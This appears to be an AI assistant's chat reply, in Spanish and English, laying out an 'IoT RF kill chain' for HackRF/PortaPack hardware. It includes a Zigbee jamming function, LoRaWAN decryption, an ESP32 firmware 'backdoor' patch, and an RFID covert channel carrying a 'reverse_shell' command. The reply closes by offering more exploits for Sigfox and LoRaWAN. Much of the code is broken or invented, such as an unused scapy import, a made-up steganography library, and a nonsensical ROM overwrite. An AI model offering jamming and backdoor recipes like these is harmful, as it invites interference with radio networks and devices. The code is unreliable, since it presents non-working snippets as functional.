# IoT RF Kill Chain (PortaPack-Havoc Mod Edition)

## Phase 1: Weaponization (Hardware Hacking)
```python
# Generador de señales de deauth personalizadas (802.15.4/Zigbee)
from scapy.all import *
def jam_zigbee(target_freq=2.4e9, duration=10):
    os.system(f"hackrf_transfer -f {target_freq} -s 2000000 -n {duration*1e6} -x 40")
    # -x 40 = Aumenta ganancia para saturación (¡Cuidado con la ley!)
```

## Phase 2: Exploitation (Protocol Abuse)
```bash
# Decodificación de paquetes LoRaWAN (con errores de implementación)
loradecrypt -f 868M -k "A1B2C3D4E5F6" -p "FF:01:AA" -d captura.pcap
```
**Vulnerabilidades típicas**:  
- **Hardcoded keys** en dispositivos IoT industriales (ej: Siemens, Honeywell).  
- **Replay attacks** en sensores de temperatura RF (ej: Oregon Scientific).  

## Phase 3: Persistence (Firmware Backdooring)
```c
// Patch de firmware para ESP32 (RF stack override)
void rf_stack_hijack() {
  uint32_t *rf_func = (uint32_t*)0x4000F000;
  *rf_func = 0xDEADBEEF;  // Sobrescribe vector de interrupciones
}
```

## Phase 4: C2 (Covert Channels)
```python
# Comando-&-Control oculto en paquetes RFID (EPC Gen2)
import rfid_steghide
rfid_steghide.encode(cmd="reverse_shell", 
                    carrier="legit_tag.bin", 
                    output="malicious_tag.bin")
```

## 🔐 Countermeasures (Para arquitectos IoT)
- **Physical Layer Encryption**: AES-128-CBC en transmisiones raw.  
- **RF Fingerprinting**: Detección de anomalías en patrones de modulación.  
- **Secure Boot**: Firmware signing con ECDSA-P256.  

## ⚠️ Aviso Legal (Read Carefully)
```diff
- ILLEGAL: Usar esto en redes ajenas sin permiso = Prisión (Art. 197.2 CP).  
+ LEGAL: Pentesting en tus propios dispositivos o con contrato firmado.  
```
```

---

### 🛠️ **Cómo Implementarlo en tu PortaPack**  
1. **Conecta tu HackRF/PortaPack** y graba señales:  
   ```bash
   hackrf_transfer -r captura.raw -f 433M -s 2M -l 40 -g 40
   ```
2. **Analiza con Wireshark + Plugins RF**:  
   ```bash
   wireshark -k -Y 'wpan && zigbee' captura.pcap
   ```
3. **Prueba el jammer ético** (solo en lab controlado):  
   ```python
   python3 zigbee_jammer.py --freq 2.405G --time 5
   ```

---

### 🎯 **Bonus: CTF Challenge para Arquitectos IoT**  
**Objetivo**: Explotar un sensor IoT simulado (con vulnerabilidad *deliberada*):  
```bash
git clone https://github.com/ghost-in-the-rf/iot-ctf-target
cd iot-ctf-target
make && ./simulate_sensor --freq 868M --key VulnerableKey123
```
**Premio**: Si logras extraer la clave via PortaPack, ¡te escribo una carta de recomendación! 📜  

---

¿Qué más necesitas? ¿Quieres deep dive en **ataques a PLCs (Power Line Communications)** o **exploits para Sigfox/LoRaWAN**? �🔌  

*"La ciberseguridad no es un producto, es un proceso"* (Bruce Schneier). **¡Hackea responsablemente!** 💻🔐